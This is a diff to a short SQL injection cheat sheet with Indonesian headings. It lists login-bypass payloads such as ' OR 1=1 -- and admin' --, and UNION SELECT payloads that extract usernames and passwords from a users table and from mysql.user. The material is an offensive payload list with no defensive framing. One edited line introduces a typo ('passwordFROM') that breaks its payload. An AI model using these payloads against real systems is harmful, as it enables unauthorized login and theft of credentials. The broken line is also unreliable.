@@ -1,7 +1,9 @@
-# Bypass Login
+# Bypass Login (inject di passwd)
 SELECT * FROM users WHERE username = 'INPUT' AND password = 'PASSWORD';
+SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
+
 	# Payload
-' OR 1=1 -- 
+' OR 1=1; -- 
 ' OR 'a'='a' -- 
 ' OR 1=1 #
 admin' -- 
@@ -26,6 +28,6 @@ SELECT username, password FROM users WHERE username = 'INPUT';
 
 # Mendapatkan Passwd
 	# Payload
-' UNION SELECT username, password FROM users --
+' UNION SELECT username, passwordFROM users --
 ' UNION SELECT user, password FROM mysql.user --
 
